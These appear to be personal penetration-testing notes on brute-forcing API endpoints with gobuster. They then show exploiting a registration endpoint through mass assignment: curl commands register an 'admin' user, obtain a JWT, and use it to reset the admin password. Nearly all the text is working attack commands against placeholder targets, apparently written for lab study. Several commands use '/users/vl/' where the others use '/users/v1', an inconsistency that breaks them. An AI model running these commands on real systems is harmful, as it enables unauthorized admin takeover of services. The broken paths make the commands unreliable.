---
title: 07 - API Enumeration & Abusing
updated: 2025-04-19 03:34:38Z
created: 2025-04-16 12:11:55Z
latitude: -33.78668940
longitude: 150.95264980
altitude: 0.0000
---

## BruteForcing API endpoints

1. Create file **pattern.txt** :
```
{GOBUSTER}/v1
{GOBUSTER}/v2
```
 2. Use **gobuster** to brute force API paths using a wordlist

`gobuster dir -u http://<target>:<port> -w /usr/share/wordlists/dirb/big.txt -p pattern.txt
`
* * *
## Priviliege Escalation 
Example bug in **/register** API : 

`curl -i http://<target>:<port>/users/v1`
`gobuster dir -u http://<target>:<port>/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt`
`curl -d '{"password":"1234","username":"admin"}' -H 'Content-Type: application/json' http://<target>:<port>/users/vl/login`

Try adding a new user:
`curl -d '{"password":"pa55w0rd","username":"WDAGUtilityAccount"}' -H 'Content-Type: application/json' http://<target>:<port>/users/vl/register`

Try adding a user with **admin=True**
`curl -d '{"password":"pa55w0rd","username":"ghost","email":"pwn@localhost","admin":"True"}' -H 'Content-Type: application/json' http://<target>:<port>/users/vl/register`

Try logging in with new user:
`curl -d '{"password":"pa55w0rd","username":"ghost"}' -H 'Content-Type: application/json' http://<target>:<port>/users/vl/login`

Hopefully you will get the **auth_token** JWT authentication token !!!

Try passing the auth_token to the API:
```
curl \
 'http://<target>:<port>/users/v1/admin/password' \
 -H 'Content-Type: application/json' \
 -H 'Authorization: OAuth xxxXxXXXXxx.XXXXXXXX.XXXXXXxxx.xxxXXX' \
 -d '{"password": "pwned"}'
```
OR
```
curl -X 'PUT' \
 'http://<target>:<port>/users/v1/admin/password' \
 -H 'Content-Type: application/json' \
 -H 'Authorization: OAuth xxxXxXXXXxx.XXXXXXXX.XXXXXXxxx.xxxXXX' \
 -d '{"password": "pwned"}'
```



